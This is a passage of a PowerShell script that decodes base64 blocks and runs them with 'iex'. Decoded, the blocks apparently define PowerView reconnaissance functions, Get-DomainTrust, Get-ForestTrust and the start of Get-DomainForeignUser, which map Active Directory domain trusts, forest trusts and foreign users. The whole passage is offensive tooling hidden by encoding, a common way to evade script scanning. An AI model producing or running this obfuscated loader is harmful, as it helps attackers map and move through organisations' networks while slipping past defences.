WV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRUcnVzdEF0dHJpYnV0ZXMgPSBAewogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDAxJyA9ICdOT05fVFJBTlNJVElWRScKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwMicgPSAnVVBMRVZFTF9PTkxZJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDA0JyA9ICdGSUxURVJfU0lEUycKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwOCcgPSAnRk9SRVNUX1RSQU5TSVRJVkUnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMTAnID0gJ0NST1NTX09SR0FOSVpBVElPTicKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAyMCcgPSAnV0lUSElOX0ZPUkVTVCcKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDA0MCcgPSAnVFJFQVRfQVNfRVhURVJOQUwnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwODAnID0gJ1RSVVNUX1VTRVNfUkM0X0VOQ1JZUFRJT04nCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAxMDAnID0gJ1RSVVNUX1VTRVNfQUVTX0tFWVMnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAyMDAnID0gJ0NST1NTX09SR0FOSVpBVElPTl9OT19UR1RfREVMRUdBVElPTicKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDQwMCcgPSAnUElNX1RSVVNUJwogICAgICAgIH0KICAgICAgICAkTGRhcFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRMZGFwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRMZGFwU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRMZGFwU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtbmUgJ0FQSScpIHsKICAgICAgICAgICAgJE5ldFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgICAgIGlmICgkRG9tYWluIC1hbmQgJERvbWFpbi5UcmltKCkgLW5lICcnKSB7CiAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gJERvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAgICAgJFNvdXJjZURvbWFpbiA9IChHZXQtRG9tYWluIC1DcmVkZW50aWFsICRDcmVkZW50aWFsKS5OYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gKEdldC1Eb21haW4pLk5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1uZSAnTkVUJykgewogICAgICAgICAgICBpZiAoJERvbWFpbiAtYW5kICREb21haW4uVHJpbSgpIC1uZSAnJykgewogICAgICAgICAgICAgICAgJFNvdXJjZURvbWFpbiA9ICREb21haW4KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRTb3VyY2VEb21haW4gPSAkRW52OlVTRVJETlNET01BSU4KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdMREFQJykgewogICAgICAgICAgICAkVHJ1c3RTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBATGRhcFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICRTb3VyY2VTSUQgPSBHZXQtRG9tYWluU0lEIEBOZXRTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICBpZiAoJFRydXN0U2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICRUcnVzdFNlYXJjaGVyLkZpbHRlciA9ICcob2JqZWN0Q2xhc3M9dHJ1c3RlZERvbWFpbiknCiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkVHJ1c3RTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJFRydXN0U2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJFByb3BzID0gJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAkVHJ1c3RBdHRyaWIgPSBAKCkKICAgICAgICAgICAgICAgICAgICAkVHJ1c3RBdHRyaWIgKz0gJFRydXN0QXR0cmlidXRlcy5LZXlzIHwgV2hlcmUtT2JqZWN0IHsgJFByb3BzLnRydXN0YXR0cmlidXRlc1swXSAtYmFuZCAkXyB9IHwgRm9yRWFjaC1PYmplY3QgeyAkVHJ1c3RBdHRyaWJ1dGVzWyRfXSB9CiAgICAgICAgICAgICAgICAgICAgJERpcmVjdGlvbiA9IFN3aXRjaCAoJFByb3BzLnRydXN0ZGlyZWN0aW9uKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIDAgeyAnRGlzYWJsZWQnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMSB7ICdJbmJvdW5kJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDIgeyAnT3V0Ym91bmQnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMyB7ICdCaWRpcmVjdGlvbmFsJyB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRUcnVzdFR5cGUgPSBTd2l0Y2ggKCRQcm9wcy50cnVzdHR5cGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgMSB7ICdXSU5ET1dTX05PTl9BQ1RJVkVfRElSRUNUT1JZJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDIgeyAnV0lORE9XU19BQ1RJVkVfRElSRUNUT1JZJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDMgeyAnTUlUJyB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICREaXN0aW5ndWlzaGVkbmFtZSA9ICRQcm9wcy5kaXN0aW5ndWlzaGVkbmFtZVswXQogICAgICAgICAgICAgICAgICAgICRTb3VyY2VOYW1lSW5kZXggPSAkRGlzdGluZ3Vpc2hlZG5hbWUuSW5kZXhPZignREM9JykKICAgICAgICAgICAgICAgICAgICBpZiAoJFNvdXJjZU5hbWVJbmRleCkgewogICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gJCgkRGlzdGluZ3Vpc2hlZG5hbWUuU3ViU3RyaW5nKCRTb3VyY2VOYW1lSW5kZXgpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gIiIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJFRhcmdldE5hbWVJbmRleCA9ICREaXN0aW5ndWlzaGVkbmFtZS5JbmRleE9mKCcsQ049U3lzdGVtJykKICAgICAgICAgICAgICAgICAgICBpZiAoJFNvdXJjZU5hbWVJbmRleCkgewogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJERpc3Rpbmd1aXNoZWRuYW1lLlN1YlN0cmluZygzLCAkVGFyZ2V0TmFtZUluZGV4LTMpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gIiIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdEd1aWQgPSBOZXctT2JqZWN0IEd1aWQgQCgsJFByb3BzLm9iamVjdGd1aWRbMF0pCiAgICAgICAgICAgICAgICAgICAgJFRhcmdldFNJRCA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRQcm9wcy5zZWN1cml0eWlkZW50aWZpZXJbMF0sMCkpLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NvdXJjZU5hbWUnICRTb3VyY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGFyZ2V0TmFtZScgJFByb3BzLm5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVHJ1c3RUeXBlJyAkVHJ1c3RUeXBlCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RydXN0QXR0cmlidXRlcycgJCgkVHJ1c3RBdHRyaWIgLWpvaW4gJywnKQogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUcnVzdERpcmVjdGlvbicgIiREaXJlY3Rpb24iCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1doZW5DcmVhdGVkJyAkUHJvcHMud2hlbmNyZWF0ZWRbMF0KICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnV2hlbkNoYW5nZWQnICRQcm9wcy53aGVuY2hhbmdlZFswXQogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRG9tYWluVHJ1c3QuTERBUCcpCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5UcnVzdF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJFRydXN0U2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ0FQSScpIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsKICAgICAgICAgICAgICAgICRUYXJnZXREQyA9ICRTZXJ2ZXIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCREb21haW4gLWFuZCAkRG9tYWluLlRyaW0oKSAtbmUgJycpIHsKICAgICAgICAgICAgICAgICRUYXJnZXREQyA9ICREb21haW4KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRUYXJnZXREQyA9ICROdWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAkRmxhZ3MgPSA2MwogICAgICAgICAgICAkRG9tYWluQ291bnQgPSAwCiAgICAgICAgICAgICRSZXN1bHQgPSAkTmV0YXBpMzI6OkRzRW51bWVyYXRlRG9tYWluVHJ1c3RzKCRUYXJnZXREQywgJEZsYWdzLCBbcmVmXSRQdHJJbmZvLCBbcmVmXSREb21haW5Db3VudCkKICAgICAgICAgICAgJE9mZnNldCA9ICRQdHJJbmZvLlRvSW50NjQoKQogICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CiAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJERTX0RPTUFJTl9UUlVTVFM6OkdldFNpemUoKQogICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJERvbWFpbkNvdW50KTsgJGkrKykgewogICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIgPSBOZXctT2JqZWN0IFN5c3RlbS5JbnRwdHIgLUFyZ3VtZW50TGlzdCAkT2Zmc2V0CiAgICAgICAgICAgICAgICAgICAgJEluZm8gPSAkTmV3SW50UHRyIC1hcyAkRFNfRE9NQUlOX1RSVVNUUwogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkTmV3SW50UHRyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgKz0gJEluY3JlbWVudAogICAgICAgICAgICAgICAgICAgICRTaWRTdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkQWR2YXBpMzI6OkNvbnZlcnRTaWRUb1N0cmluZ1NpZCgkSW5mby5Eb21haW5TaWQsIFtyZWZdJFNpZFN0cmluZyk7JExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlTmFtZScgJFNvdXJjZURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGFyZ2V0TmFtZScgJEluZm8uRG5zRG9tYWluTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGFyZ2V0TmV0Ymlvc05hbWUnICRJbmZvLk5ldGJpb3NEb21haW5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdGbGFncycgJEluZm8uRmxhZ3MKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1BhcmVudEluZGV4JyAkSW5mby5QYXJlbnRJbmRleAogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVHJ1c3RUeXBlJyAkSW5mby5UcnVzdFR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RydXN0QXR0cmlidXRlcycgJEluZm8uVHJ1c3RBdHRyaWJ1dGVzCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUYXJnZXRTaWQnICRTaWRTdHJpbmcKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldEd1aWQnICRJbmZvLkRvbWFpbkd1aWQKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Eb21haW5UcnVzdC5BUEknKQogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRm91bmREb21haW4gPSBHZXQtRG9tYWluIEBOZXRTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICBpZiAoJEZvdW5kRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkRm91bmREb21haW4uR2V0QWxsVHJ1c3RSZWxhdGlvbnNoaXBzKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJF8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVCcpCiAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdFRydXN0IHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkZvcmVzdFRydXN0Lk5FVCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0LAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgUFJPQ0VTUyB7CiAgICAgICAgJE5ldEZvcmVzdEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICROZXRGb3Jlc3RBcmd1bWVudHNbJ0ZvcmVzdCddID0gJEZvcmVzdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICROZXRGb3Jlc3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkRm91bmRGb3Jlc3QgPSBHZXQtRm9yZXN0IEBOZXRGb3Jlc3RBcmd1bWVudHMKICAgICAgICBpZiAoJEZvdW5kRm9yZXN0KSB7CiAgICAgICAgICAgICRGb3VuZEZvcmVzdC5HZXRBbGxUcnVzdFJlbGF0aW9uc2hpcHMoKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRfLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Gb3Jlc3RUcnVzdC5ORVQnKQogICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkZvcmVpZ25Vc2VyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkZvcmVpZ25Vc2VyJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJyhtZW1iZXJvZj0qKScKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3